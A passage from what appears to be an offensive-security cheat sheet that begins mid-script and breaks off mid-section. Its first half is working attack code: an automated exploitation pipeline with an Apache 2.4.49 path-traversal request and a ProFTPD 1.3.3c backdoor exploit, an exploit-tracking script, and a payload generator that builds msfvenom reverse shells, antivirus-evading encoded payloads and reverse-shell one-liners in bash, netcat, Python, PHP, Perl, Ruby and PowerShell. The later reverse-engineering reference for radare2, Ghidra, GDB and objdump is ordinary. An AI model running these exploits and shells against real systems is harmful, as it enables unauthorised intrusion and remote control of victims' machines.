"http://$TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" EXPLOIT_EOF

chmod +x exploits/apache_2449_exploit.sh
./exploits/apache_2449_exploit.sh $TARGET | tee exploits/apache_exploit_output.txt

fi

if grep -q "ProFTPD 1.3.3c" recon/quick_scan.txt; then echo "[+] ProFTPD 1.3.3c Backdoor detected!"

cat > exploits/proftpd_exploit.py << 'EXPLOIT_EOF'

#!/usr/bin/env python3 import socket import sys

target = sys.argv[1] port = 21

print(f"[*] Exploiting ProFTPD 1.3.3c Backdoor on {target}:{port}")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((target, port))

banner = sock.recv(1024) print(f"[*] Banner: {banner.decode()}")

# Send backdoor trigger

sock.send(b"USER test:)\n") sock.recv(1024)

sock.send(b"PASS test\n") sock.recv(1024)

# Connect to backdoor shell on port 6200

print("[*] Connecting to backdoor on port 6200...") shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) shell_sock.connect((target, 6200))

print("[+] Backdoor shell obtained!") print("[*] Sending 'id' command...") shell_sock.send(b"id\n") print(shell_sock.recv(1024).decode())

sock.close() shell_sock.close() EXPLOIT_EOF

chmod +x exploits/proftpd_exploit.py
python3 exploits/proftpd_exploit.py $TARGET | tee exploits/proftpd_output.txt

fi

# Phase 6: Wait and Aggregate Results

echo "" echo "[Phase 6] Aggregating Results" echo "------------------------------"

echo "[*] Waiting for background jobs to complete..." sleep 30

# Check for successful exploitations

echo "" echo "=== EXPLOITATION RESULTS ===" echo ""

# Check Metasploit sessions

echo "[*] Metasploit Sessions:" ps -p $msf_pid > /dev/null 2>&1 && kill -0 $msf_pid 2>/dev/null if [ $? -eq 0 ]; then echo "[~] Metasploit still running - check manually" else if grep -q "session.*opened" exploits/msf_output.txt; then echo "[+] METASPLOIT SESSIONS OBTAINED!" grep "session.*opened" exploits/msf_output.txt else echo "[-] No Metasploit sessions" fi fi

# Check SQLMap results

echo "" echo "[_] SQL Injection Results:" if [ -d exploits/sqlmap ]; then if find exploits/sqlmap -name "_.csv" -o -name "_.txt" | grep -q .; then echo "[+] SQL INJECTION SUCCESSFUL - Data dumped!" find exploits/sqlmap -type f -name "_.csv" else echo "[-] No SQL injection success" fi fi

# Check default credentials

echo "" echo "[*] Default Credential Results:" if [ -f exploits/ssh_defaults.txt ] && grep -q "password:" exploits/ssh_defaults.txt; then echo "[+] SSH DEFAULT CREDENTIALS FOUND!" grep "password:" exploits/ssh_defaults.txt fi

if [ -f exploits/mysql_defaults.txt ] && grep -q "password:" exploits/mysql_defaults.txt; then echo "[+] MYSQL DEFAULT CREDENTIALS FOUND!" grep "password:" exploits/mysql_defaults.txt fi

# Check custom exploits

echo "" echo "[*] Custom Exploit Results:" if [ -f exploits/apache_exploit_output.txt ]; then if grep -q "root:" exploits/apache_exploit_output.txt; then echo "[+] APACHE PATH TRAVERSAL SUCCESSFUL!" fi fi

if [ -f exploits/proftpd_output.txt ]; then if grep -q "uid=" exploits/proftpd_output.txt; then echo "[+] PROFTPD BACKDOOR SUCCESSFUL!" fi fi

# Phase 7: Generate Report

echo "" echo "[Phase 7] Generating Report" echo "---------------------------"

cat > EXPLOITATION_REPORT.md << EOF

# Exploitation Report - $TARGET

Generated: $(date)

## Target Information

- IP Address: $TARGET
- Scan Date: $(date)

## Discovered Services

``` $(cat recon/quick_scan.txt | grep "open") ```

## Exploitation Attempts

### Metasploit

- Resource Script: exploits/msf_auto.rc
- Output: exploits/msf_output.txt $(grep -q "session.*opened" exploits/msf_output.txt && echo "- **Status: SUCCESS**" || echo "- Status: No sessions obtained")

### SQL Injection

- Tool: SQLMap
- Results Directory: exploits/sqlmap/ $([ -d exploits/sqlmap ] && find exploits/sqlmap -name "*.csv" | wc -l | xargs echo "- Databases dumped:" || echo "- Status: Not vulnerable")

### Default Credentials

$([ -f exploits/ssh_defaults.txt ] && grep -q "password:" exploits/ssh_defaults.txt && echo "- **SSH: Credentials found**" || echo "- SSH: No default credentials") $([ -f exploits/mysql_defaults.txt ] && grep -q "password:" exploits/mysql_defaults.txt && echo "- **MySQL: Credentials found**" || echo "- MySQL: No default credentials")

### Custom Exploits

$([ -f exploits/apache_exploit_output.txt ] && grep -q "root:" exploits/apache_exploit_output.txt && echo "- **Apache 2.4.49: Successful**" || echo "- Apache: Not tested or failed") $([ -f exploits/proftpd_output.txt ] && grep -q "uid=" exploits/proftpd_output.txt && echo "- **ProFTPD 1.3.3c: Successful**" || echo "- ProFTPD: Not tested or failed")

## Recommendations

### Successful Exploits

Review the following files for successful exploitation details: $(find exploits -type f -name "*output.txt" -o -name "*results.txt" | sed 's/^/- /')

### Next Steps

1. If sessions obtained: Run post-exploitation enumeration
2. If credentials found: Test for privilege escalation
3. If exploits failed: Review nmap output for additional services
4. Manual testing may be required for complex vulnerabilities

## Files

- Full Nmap Scan: recon/full_scan.nmap
- Exploit Database Search: exploits/searchsploit_results.txt
- All outputs: exploits/

EOF

echo "[+] Report generated: EXPLOITATION_REPORT.md"

# Display summary

echo "" echo "=========================================" echo " EXPLOITATION PIPELINE COMPLETE" echo "=========================================" echo "Workspace: $(pwd)" echo "Report: EXPLOITATION_REPORT.md" echo "" cat EXPLOITATION_REPORT.md

# Cleanup background jobs

echo "" echo "[*] Cleaning up background processes..." jobs -p | xargs -r kill 2>/dev/null

echo "[*] Pipeline complete!"
````

**Exploit Database Manager:**

```bash
#!/bin/bash
# Manage local exploit database and track successful exploits

DB_DIR="$HOME/.exploit_db"
EXPLOITS_FILE="$DB_DIR/exploits.json"
SUCCESS_LOG="$DB_DB/successful_exploits.log"

mkdir -p $DB_DIR

# Initialize database
if [ ! -f "$EXPLOITS_FILE" ]; then
    echo "[]" > $EXPLOITS_FILE
fi

add_exploit() {
    local name=$1
    local path=$2
    local category=$3
    local platform=$4
    
    echo "[*] Adding exploit to database: $name"
    
    # Create entry
    jq --arg name "$name" \
       --arg path "$path" \
       --arg category "$category" \
       --arg platform "$platform" \
       --arg date "$(date -Iseconds)" \
       '. += [{
           name: $name,
           path: $path,
           category: $category,
           platform: $platform,
           added_date: $date,
           success_count: 0,
           last_used: null
       }]' $EXPLOITS_FILE > ${EXPLOITS_FILE}.tmp
    
    mv ${EXPLOITS_FILE}.tmp $EXPLOITS_FILE
    echo "[+] Exploit added successfully"
}

log_success() {
    local exploit_name=$1
    local target=$2
    
    echo "$(date -Iseconds)|$exploit_name|$target|SUCCESS" >> $SUCCESS_LOG
    
    # Update success count
    jq --arg name "$exploit_name" \
       --arg date "$(date -Iseconds)" \
       '(.[] | select(.name == $name) | .success_count) += 1 |
        (.[] | select(.name == $name) | .last_used) = $date' \
       $EXPLOITS_FILE > ${EXPLOITS_FILE}.tmp
    
    mv ${EXPLOITS_FILE}.tmp $EXPLOITS_FILE
    
    echo "[+] Success logged for: $exploit_name"
}

search_exploits() {
    local query=$1
    
    echo "[*] Searching local database for: $query"
    jq -r --arg query "$query" \
       '.[] | select(.name | contains($query) or .category | contains($query)) | 
        "\(.name) - \(.path) [\(.platform)/\(.category)] Success: \(.success_count)"' \
       $EXPLOITS_FILE
}

get_top_exploits() {
    local count=${1:-10}
    
    echo "[*] Top $count most successful exploits:"
    jq -r --argjson count "$count" \
       'sort_by(.success_count) | reverse | .[:$count] | 
        .[] | "\(.success_count)x - \(.name) (\(.platform))"' \
       $EXPLOITS_FILE
}

case "$1" in
    add)
        add_exploit "$2" "$3" "$4" "$5"
        ;;
    log)
        log_success "$2" "$3"
        ;;
    search)
        search_exploits "$2"
        ;;
    top)
        get_top_exploits "$2"
        ;;
    *)
        echo "Usage:"
        echo "  $0 add <name> <path> <category> <platform>"
        echo "  $0 log <name> <target>"
        echo "  $0 search <query>"
        echo "  $0 top [count]"
        ;;
esac
````

**Cross-Platform Payload Generator:**

```bash
#!/bin/bash
# Generate payloads for multiple platforms and scenarios

LHOST=${1:-10.10.14.5}
LPORT=${2:-4444}
OUTPUT_DIR="payloads_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR/{linux,windows,web,encoded}

echo "[*] Cross-Platform Payload Generator"
echo "[*] LHOST: $LHOST"
echo "[*] LPORT: $LPORT"
echo "[*] Output: $OUTPUT_DIR"

# Linux payloads
echo ""
echo "[*] Generating Linux payloads..."

msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f elf -o $OUTPUT_DIR/linux/shell_x86.elf

msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f elf -o $OUTPUT_DIR/linux/shell_x64.elf

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f elf -o $OUTPUT_DIR/linux/meterpreter_x64.elf

# Windows payloads
echo ""
echo "[*] Generating Windows payloads..."

msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f exe -o $OUTPUT_DIR/windows/shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f exe -o $OUTPUT_DIR/windows/shell_x64.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f exe -o $OUTPUT_DIR/windows/meterpreter.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=$LHOST LPORT=443 \
    -f exe -o $OUTPUT_DIR/windows/meterpreter_https.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f dll -o $OUTPUT_DIR/windows/shell.dll

# Web payloads
echo ""
echo "[*] Generating web payloads..."

# PHP
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT \
    -f raw -o $OUTPUT_DIR/web/shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f raw -o $OUTPUT_DIR/web/shell.jsp

# ASP
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f asp -o $OUTPUT_DIR/web/shell.asp

# ASPX
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f aspx -o $OUTPUT_DIR/web/shell.aspx

# Python
msfvenom -p python/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f raw -o $OUTPUT_DIR/web/shell.py

# Encoded payloads (AV evasion)
echo ""
echo "[*] Generating encoded payloads..."

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -e x86/shikata_ga_nai -i 10 -f exe -o $OUTPUT_DIR/encoded/meterpreter_encoded.exe

msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -e x86/countdown -i 5 -f exe -o $OUTPUT_DIR/encoded/shell_countdown.exe

# Shellcode formats
echo ""
echo "[*] Generating shellcode formats..."

msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f python -o $OUTPUT_DIR/linux/shellcode.py

msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f c -o $OUTPUT_DIR/linux/shellcode.c

msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f python -o $OUTPUT_DIR/windows/shellcode.py

# One-liners
echo ""
echo "[*] Generating one-liner payloads..."

cat > $OUTPUT_DIR/one_liners.txt << EOF
# Bash TCP Reverse Shell
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

# Netcat Reverse Shell
nc -e /bin/bash $LHOST $LPORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f

# Python Reverse Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP Reverse Shell
php -r '\$sock=fsockopen("$LHOST",$LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl Reverse Shell
perl -e 'use Socket;\$i="$LHOST";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Ruby Reverse Shell
ruby -rsocket -e'f=TCPSocket.open("$LHOST",$LPORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

# PowerShell Reverse Shell
powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
EOF

echo ""
echo "[+] Payload generation complete!"
echo "[+] Location: $OUTPUT_DIR"
echo ""
echo "File summary:"
find $OUTPUT_DIR -type f | wc -l | xargs echo "Total files:"
du -sh $OUTPUT_DIR | awk '{print "Total size: " $1}'
```

---

#### Summary and Best Practices

**Exploitation Tool Selection Matrix:**

```
Scenario                          | Primary Tool    | Secondary Tool  | Custom Script
----------------------------------|-----------------|-----------------|---------------
Known CVE with Metasploit module  | Metasploit      | Searchsploit    | N/A
Known CVE without MSF module      | Searchsploit    | Custom Script   | Metasploit Handler
Web application vulnerability     | Custom Script   | SQLMap/Burp     | Metasploit
Zero-day/Custom application       | Custom Script   | Fuzzing tools   | Metasploit Handler
Privilege escalation              | Custom Script   | Metasploit Post | Searchsploit
Post-exploitation                 | Meterpreter     | Custom Script   | Empire/Covenant
```

**Best Practices:**

1. **Always verify exploit applicability** - Check exact version numbers
2. **Test exploits in safe environment first** - Avoid system crashes
3. **Maintain exploit database** - Track successful techniques
4. **Combine tools strategically** - Use each for its strengths
5. **Document modifications** - Record changes to public exploits
6. **Practice responsible disclosure** - Follow ethical guidelines

---

#### Important Related Topics

For complete exploitation tooling mastery, consider studying:

- **Buffer Overflow Exploitation** - Manual exploit development with GDB/Immunity
- **Web Application Hacking Tools** - Burp Suite, OWASP ZAP, Nikto
- **Password Cracking Tools** - John the Ripper, Hashcat, Hydra
- **Post-Exploitation Tools** - Mimikatz, BloodHound, PowerSploit, LinPEAS/WinPEAS

---

### Reverse Engineering

**Radare2**

```bash
# Installation (if not present)
sudo apt install radare2

# Launch radare2
r2 <binary>

# Common startup options
r2 -A <binary>          # Auto-analyze on load
r2 -d <binary>          # Debug mode
r2 -w <binary>          # Write mode (modify binary)
r2 -B <baddr> <binary>  # Set base address
r2 -AA <binary>         # Extended analysis
r2 -c <cmd> <binary>    # Run command and exit

# Visual mode
r2 -A <binary>
V                       # Enter visual mode
VV                      # Visual graph mode
p                       # Cycle through print modes
```

**Radare2 Basic Commands**

```bash
# Analysis commands
aaa                     # Analyze all (aggressive)
afl                     # List all functions
afi                     # Function information
afvl                    # List local variables
afvd                    # Display function arguments
afn <newname>           # Rename function
pdf @ <function>        # Print disassembly of function
pdf @ main              # Disassemble main function

# Seeking (navigation)
s <address>             # Seek to address
s main                  # Seek to main function
s 0x08048000           # Seek to specific address
s+                      # Undo seek
s-                      # Redo seek

# Information gathering
i                       # Binary info
ii                      # Imports
ie                      # Entry points
iS                      # Sections
iz                      # Strings in data section
izz                     # All strings in binary
is                      # Symbols

# Disassembly
pd <n>                  # Print n instructions
pdf                     # Print disassembly of function
pdc                     # Pseudo C code (decompilation)
pdd                     # Disassemble function data flow
pd 20 @ main           # Print 20 instructions at main

# Hex dump
px <n>                  # Hexdump n bytes
px 100                  # Hexdump 100 bytes
pxw                     # Hexdump words
pxq                     # Hexdump qwords (64-bit)

# Cross references
axt <address>           # Find references TO address
axf <address>           # Find references FROM address
axt @ sym.main         # References to main function

# Variables and registers
dr                      # Show register values
dr eax                  # Show EAX register
dr eax=0x1234          # Set EAX value
afvd                    # Show function variables
```

**Radare2 Debugging**

```bash
# Start debugging
r2 -d <binary>          # Debug mode
r2 -d <binary> <args>   # With arguments

# Debug commands
db <address>            # Set breakpoint
db main                 # Breakpoint at main
dbl                     # List breakpoints
db- <address>           # Remove breakpoint
dbc <address> <cmd>     # Conditional breakpoint

dc                      # Continue execution
ds                      # Step into
dso                     # Step over
dsu <address>           # Continue until address
dc main                 # Continue until main

# Process control
dk 9                    # Kill process
dko                     # Show process memory maps
dm                      # Show memory maps
dmi <lib>               # Show library symbols

# Register manipulation
dr                      # Show all registers
dr eax=0x41             # Set register value
dr?                     # Register help

# Memory operations
px @ esp                # Hexdump at stack pointer
pxw 32 @ esp           # Show 32 bytes from stack
dm                      # Memory maps
dmh                     # Heap info
```

**Radare2 Binary Patching**

```bash
# Open in write mode
r2 -w <binary>

# Write operations
wa <instruction>        # Write assembly
wx <hex>                # Write hex bytes
wz <string>             # Write string

# Example: NOP out instruction
s 0x08048123           # Seek to address
wa nop                  # Write NOP instruction

# Example: Change bytes
wx 9090                 # Write two NOPs (0x90)

# Example: Patch function call
s 0x08048456
wa "mov eax, 0x1"      # Replace with mov instruction

# Save changes
wci                     # Commit changes to file
```

**Radare2 Scripts (r2pipe)**

```python
#!/usr/bin/env python3
import r2pipe

# Open binary
r2 = r2pipe.open("./binary")

# Auto-analyze
r2.cmd("aaa")

# Get functions
functions = r2.cmdj("aflj")  # JSON output
for func in functions:
    print(f"Function: {func['name']} at {hex(func['offset'])}")

# Get strings
strings = r2.cmdj("izzj")
for s in strings:
    print(f"String at {hex(s['vaddr'])}: {s['string']}")

# Disassemble main
disasm = r2.cmd("pdf @ main")
print(disasm)

# Find XORs (potential crypto)
xor_refs = r2.cmd("/ xor")
print(xor_refs)

# Close
r2.quit()
```

**Radare2 CTF Examples**

```bash
# Finding flag strings
r2 -AA binary
izz~flag                # Search strings for "flag"
izz~CTF                 # Search for "CTF"

# Finding main function
afl~main                # List functions matching "main"
s main                  # Seek to main
pdf                     # Disassemble

# Finding interesting functions
afl | grep -E "check|verify|auth|validate"

# Analyzing control flow
VV                      # Visual graph mode
agf                     # ASCII control flow graph

# Finding function calls
axt @ sym.imp.system   # References to system()
axt @ sym.imp.strcmp   # References to strcmp()

# Extracting data
px 32 @ obj.flag        # Hexdump flag object
ps @ str.flag           # Print string at flag

# Scripting analysis
r2 -qc "aaa; afl; q" binary  # Analyze and list functions
```

**Ghidra**

```bash
# Launch Ghidra
ghidraRun

# Headless analysis
analyzeHeadless <project_location> <project_name> -import <binary> -postScript <script.py>

# Example: Batch analysis
analyzeHeadless /tmp/ghidra_projects MyProject -import malware.exe -postScript findStrings.py

# Ghidra Server (team collaboration)
ghidraSvr console
ghidraSvr start
ghidraSvr stop
```

**Ghidra GUI Workflow**

```
1. Create New Project
   - File → New Project
   - Non-Shared or Shared
   - Choose location and name

2. Import Binary
   - File → Import File
   - Select binary
   - Choose format (auto-detect usually works)
   - Language: auto-detect or manual selection

3. Analysis
   - Double-click imported file
   - Click "Yes" to analyze
   - Analysis Options:
     ☑ ASCII Strings
     ☑ Call Convention Identification
     ☑ Create Address Tables
     ☑ Data Reference
     ☑ Decompiler Parameter ID
     ☑ Embedded Media
     ☑ Function Start Search
     ☑ Non-Returning Functions
     ☑ Reference
     ☑ Stack
     ☑ Subroutine References
     ☑ x86 Constant Reference Analyzer

4. Navigation Windows
   - Program Trees: File structure
   - Symbol Tree: Functions, imports, exports
   - Data Type Manager: Data structures
   - Defined Strings: All strings
   - Functions: Function list
   - Decompiler: C-like pseudocode
```

**Ghidra Key Features**

```
Listing Window (Assembly):
- Shows disassembled code
- Color-coded instructions
- Cross-references
- Comments and labels
- Right-click for options:
  - Rename variable/function
  - Retype variable
  - Edit function signature
  - Set breakpoint (debug mode)

Decompiler Window:
- Pseudo-C code
- Click to navigate
- Edit variable names
- Change types
- Add comments
- Middle-click: go to definition

Symbol Tree:
Functions:
  - Imports: External functions
  - Exports: Exported functions
  - User functions
  - Thunk functions

Labels:
  - User-defined labels
  - Auto-generated labels

Data:
  - Global variables
  - Strings

Program Tree:
  - Memory sections
  - .text (code)
  - .data (initialized data)
  - .bss (uninitialized)
  - .rodata (read-only data)
```

**Ghidra Keyboard Shortcuts**

```bash
# Navigation
G                       # Go to address/function
Ctrl+E                  # Edit function signature
L                       # Rename (label)
;                       # Add comment
Ctrl+Shift+G           # Go to reference
Alt+Left/Right         # Navigate back/forward

# Analysis
D                       # Disassemble
C                       # Clear code bytes
F                       # Create function
U                       # Undefine
P                       # Create pointer
T                       # Choose data type
[                       # Create array

# Search
Ctrl+Shift+E           # Search for strings
Ctrl+Shift+F           # Search memory
S                       # Search for scalars
Ctrl+F                  # Find text

# Display
Ctrl+F1-F9             # Toggle different views
Space                   # Toggle between assembly/bytes
```

**Ghidra Scripting (Python)**

```python
# findStrings.py - Find interesting strings
from ghidra.program.model.mem import MemoryAccessException

# Get current program
program = getCurrentProgram()
memory = program.getMemory()
listing = program.getListing()

# Find all defined strings
strings = listing.getDefinedData(True)

print("Interesting strings:")
for data in strings:
    if data.hasStringValue():
        string_value = data.getValue()
        address = data.getAddress()
        
        # Look for interesting patterns
        if any(keyword in str(string_value).lower() for keyword in ["flag", "password", "key", "secret"]):
            print(f"{address}: {string_value}")
```

```python
# findCrypto.py - Find potential crypto operations
from ghidra.program.model.symbol import RefType

# Get current program
program = getCurrentProgram()
listing = program.getListing()
functionManager = program.getFunctionManager()

# Crypto-related instructions/functions
crypto_keywords = ["xor", "rol", "ror", "aes", "des", "rsa", "sha", "md5"]

print("Potential crypto operations:")

# Search functions
for func in functionManager.getFunctions(True):
    func_name = func.getName().lower()
    if any(keyword in func_name for keyword in crypto_keywords):
        print(f"Function: {func.getName()} at {func.getEntryPoint()}")

# Search instructions
instructions = listing.getInstructions(True)
for instr in instructions:
    mnemonic = instr.getMnemonicString().lower()
    if mnemonic in ["xor", "rol", "ror"]:
        # Check if it's not zeroing out
        if len(instr.getOpObjects(0)) > 0:
            op1 = instr.getOpObjects(0)[0]
            op2 = instr.getOpObjects(1)[0] if len(instr.getOpObjects(1)) > 0 else None
            if op1 != op2:  # Not XOR reg, reg (zeroing)
                print(f"{instr.getAddress()}: {instr}")
```

**Ghidra vs Radare2 Comparison**

```markdown
| Feature | Ghidra | Radare2 |
|---------|--------|---------|
| Interface | GUI (Java-based) | CLI/TUI |
| Decompiler | Yes (excellent) | Limited (r2dec plugin) |
| Learning Curve | Medium | Steep |
| Speed | Medium (Java) | Fast (C) |
| Scripting | Python, Java | Python (r2pipe), shell |
| Debugging | Limited | Excellent |
| Collaboration | Yes (server mode) | Limited |
| Platforms | Cross-platform | Cross-platform |
| Price | Free (NSA) | Free (LGPL) |
| Best For | Static analysis, decompilation | Dynamic analysis, scripting |
```

**GDB (GNU Debugger)**

```bash
# Launch GDB
gdb <binary>
gdb -q <binary>         # Quiet mode
gdb --args <binary> arg1 arg2  # With arguments

# Attach to running process
gdb -p <pid>
gdb attach <pid>

# Core dump analysis
gdb <binary> <core_dump>
```

**GDB Basic Commands**

```bash
# Running the program
run                     # Run program
run arg1 arg2          # Run with arguments
run < input.txt        # Run with input redirection
start                  # Run and break at main
continue               # Continue execution
c                      # Short for continue

# Breakpoints
break main             # Break at main
break *0x08048000      # Break at address
break file.c:42        # Break at source line
break func if x==5     # Conditional breakpoint
info breakpoints       # List breakpoints
delete 1               # Delete breakpoint 1
delete                 # Delete all breakpoints
disable 1              # Disable breakpoint
enable 1               # Enable breakpoint

# Watchpoints (break on data access)
watch variable         # Break when variable changes
rwatch variable        # Break when variable is read
awatch variable        # Break on read or write

# Stepping
step                   # Step into (source level)
next                   # Step over (source level)
stepi                  # Step into (instruction level)
nexti                  # Step over (instruction level)
finish                 # Run until function returns
until 42               # Run until line 42

# Examining code
disassemble main       # Disassemble function
disas main             # Short form
disas /r main          # Show raw bytes
disas /m main          # Mix source with assembly
x/10i $pc              # Examine 10 instructions at PC
list                   # Show source code
list main              # Show main function source
```

**GDB Memory Examination**

```bash
# Examine memory
x/nfu <address>
# n = count
# f = format (x=hex, d=decimal, u=unsigned, s=string, i=instruction)
# u = unit (b=byte, h=halfword, w=word, g=giant/8bytes)

# Examples
x/10x $esp             # 10 hex words at stack pointer
x/10xb 0x08048000      # 10 hex bytes at address
x/s 0x08048000         # String at address
x/10i main             # 10 instructions at main
x/10gx $rsp            # 10 64-bit hex values at RSP

# Memory search
find <start>, <end>, <pattern>
find 0x08048000, 0x08049000, 0x41414141
find /b 0x08048000, +1000, 0x90  # Find NOP bytes

# Display memory continuously
display/10i $pc        # Show 10 instructions at PC after each step
display/10x $esp       # Show stack after each step
undisplay 1            # Remove display 1
```

**GDB Register Operations**

```bash
# Show registers
info registers         # All registers
info registers eax     # Specific register
print $eax             # Print register value
print/x $eax           # Print in hex
print/t $eax           # Print in binary

# Set register values
set $eax = 0x41414141
set $rip = 0x08048000

# 32-bit registers: eax, ebx, ecx, edx, esi, edi, ebp, esp, eip
# 64-bit registers: rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip
```

**GDB Stack Analysis**

```bash
# Backtrace
bt                     # Show call stack
bt full                # Show stack with local variables
frame 0                # Switch to frame 0
up                     # Move up call stack
down                   # Move down call stack

# Stack information
info frame             # Current frame info
info args              # Function arguments
info locals            # Local variables

# Stack examination
x/40x $esp             # Hexdump stack (32-bit)
x/40gx $rsp            # Hexdump stack (64-bit)
```

**GDB with PEDA (Python Exploit Development Assistance)**

```bash
# Install PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# PEDA commands
checksec               # Check binary protections
pattern create 200     # Create cyclic pattern
pattern offset 0x41414141  # Find offset of pattern
ropgadget              # Find ROP gadgets
searchmem "flag"       # Search memory for string
vmmap                  # Show virtual memory map
context                # Show context (registers, stack, code)

# Stack buffer overflow workflow
gdb -q ./vuln
checksec               # Check protections
pattern create 200     # Create pattern
run < <(pattern create 200)  # Run with pattern
# Crash occurs
pattern offset $eip    # Find offset
# Use offset for exploit
```

**GDB with GEF (GDB Enhanced Features)**

```bash
# Install GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Or manually
wget -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py
echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit

# GEF commands
gef config             # Show configuration
heap chunks            # Show heap chunks
heap bins              # Show heap bins
heap arenas            # Show heap arenas
xinfo <address>        # Detailed info about address
search-pattern "flag"  # Search for pattern
elf-info               # ELF binary information
got                    # Show GOT entries
plt                    # Show PLT entries
canary                 # Show stack canary value
pie                    # PIE information
```

**GDB Scripting**

```bash
# GDB script file (commands.gdb)
set pagination off
set disassembly-flavor intel
break main
run
info registers
x/10x $esp
continue
quit

# Run script
gdb -x commands.gdb ./binary

# Python scripting in GDB
python
import gdb
# Get register value
rax = gdb.parse_and_eval("$rax")
print(f"RAX: {rax}")
# Set breakpoint
gdb.Breakpoint("main")
end
```

**Objdump**

```bash
# Basic usage
objdump -d <binary>             # Disassemble executable sections
objdump -D <binary>             # Disassemble all sections
objdump -s <binary>             # Display all sections
objdump -x <binary>             # Display all headers

# Common options
objdump -d -M intel <binary>    # Intel syntax
objdump -d --no-show-raw-insn <binary>  # Hide hex bytes
objdump -S <binary>             # Interleave source (if compiled with -g)

# Specific sections
objdump -d -j .text <binary>    # Disassemble .text only
objdump -s -j .data <binary>    # Hexdump .data section
objdump -s -j .rodata <binary>  # Hexdump .rodata section

# Headers
objdump -f <binary>             # File header
objdump -h <binary>             # Section headers
objdump -p <binary>             # Program headers
objdump -t <binary>             # Symbol table
objdump -T <binary>             # Dynamic symbol table
objdump -R <binary>             # Dynamic relocations

# Disassembly with source
objdump -S -l <binary>          # Source line numbers

# Extract specific functions
objdump -d <binary> | grep -A 50 "<main>"
```

**Objdump Analysis Examples**

```bash
# Find all function calls
objdump -d binary | grep "call"

# Find string references
objdump -s -j .rodata binary | grep -o "flag.*"

# Check for stack canaries
objdump -d binary | grep "stack_chk_fail"

# Find GOT entries
objdump -R binary

# Check for PIE
objdump -f binary | grep "DYNAMIC"

# Find all strings
objdump -s binary | grep -o "\w\{4,\}"

# Compare two binaries
diff <(objdump -d binary1) <(objdump -d binary2)

# Extract assembly to file
objdump -d -M intel binary > assembly.asm
```

**Objdump vs Other Tools**

```bash
# Show relocations
objdump -R binary
readelf -r binary

# Show dynamic symbols
objdump -T binary
nm -D binary
readelf -s binary

# Show section headers
objdump -h binary
readelf -S binary

# Show program headers
objdump -p binary
readelf -l binary
```

**Additional Reverse Engineering Tools**

```bash
# Strings - Extract printable strings
strings <binary>
strings -n 8 <binary>          # Minimum length 8
strings -e l <binary>          # 16-bit little endian
strings -e b <binary>          # 16-bit big endian
strings -t x <binary>          # Show offset in hex
strings -a <binary>            # Scan entire file

# File - Identify file type
file <binary>
file -b <binary>               # Brief output
file -i <binary>               # MIME type

# Hexdump tools
xxd <binary>                   # Hex dump
xxd -g 1 <binary>              # Group by 1 byte
xxd -r dump.hex binary         # Reverse (hex to binary)
hexdump -C <binary>            # Canonical hex+ASCII
hd <binary>                    # Shortcut for hexdump -C

# nm - Symbol table
nm <binary>                    # List symbols
nm -D <binary>                 # Dynamic symbols only
nm -a <binary>                 # All symbols
nm -g <binary>                 # External symbols only
nm -u <binary>                 # Undefined symbols

# readelf - ELF analysis
